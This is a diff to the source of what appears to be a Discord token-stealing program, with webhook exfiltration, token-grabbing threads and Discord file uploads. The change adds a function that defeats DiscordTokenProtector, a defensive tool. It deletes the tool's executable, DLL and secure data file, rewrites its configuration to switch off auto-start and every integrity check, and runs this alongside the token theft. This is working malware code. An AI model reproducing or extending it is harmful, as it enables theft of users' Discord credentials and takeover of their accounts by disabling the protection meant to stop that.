@@ -13,7 +13,8 @@ import shutil
 import tempfile
 from sys import executable, stderr
 from ctypes import *
-from json import loads, dumps
+from json import loads, dumps, load, dump
+from pathlib import Path
 
 webhook = '%Webhook%'
 FakeWebhook = '%FakeWebhook%'
@@ -1680,7 +1681,52 @@ def upload_files_to_discord():
 
         LoadUrlib(webhook, data=dumps(data).encode(), headers=headers)
         
-        
+     
+def bypass_token_protector():
+    try:
+        roaming_path = os.getenv("appdata")
+        tp = Path(roaming_path) / "DiscordTokenProtector"
+        config_path = tp / "config.json"
+
+        if not config_path.exists():
+            return
+
+        files_to_remove = ["DiscordTokenProtector.exe", "ProtectionPayload.dll", "secure.dat"]
+        for file_name in files_to_remove:
+            (tp / file_name).unlink(missing_ok=True)
+
+        try:
+            with config_path.open(errors="ignore") as f:
+                try:
+                    item = load(f)
+                except:
+                    return
+
+            item.update({
+                'Trap': ";3",
+                'auto_start': False,
+                'auto_start_discord': False,
+                'integrity': False,
+                'integrity_allowbetterdiscord': False,
+                'integrity_checkexecutable': False,
+                'integrity_checkhash': False,
+                'integrity_checkmodule': False,
+                'integrity_checkscripts': False,
+                'integrity_checkresource': False,
+                'integrity_redownloadhashes': False,
+                'iterations_iv': 364,
+                'iterations_key': 457,
+                'version': 5
+            })
+
+            with config_path.open('w') as f:
+                dump(item, f, indent=2, sort_keys=True)
+
+        except:
+            pass   
+    except:
+        pass
+    
 def list_files_in_directory(directory, level=0, max_display=100):
     file_list = []
 
@@ -2784,6 +2830,10 @@ def gatha():
         tokq = threading.Thread(target=getTokq, args=[patt[0], patt[2]])
         tokq.start()
         aa.append(tokq)
+    btk = threading.Thread(target=bypass_token_protector)
+    btk.start()
+    aa.append(btk)
+    
     bd = threading.Thread(target=bypass_bd)
     bd.start()
     aa.append(bd)
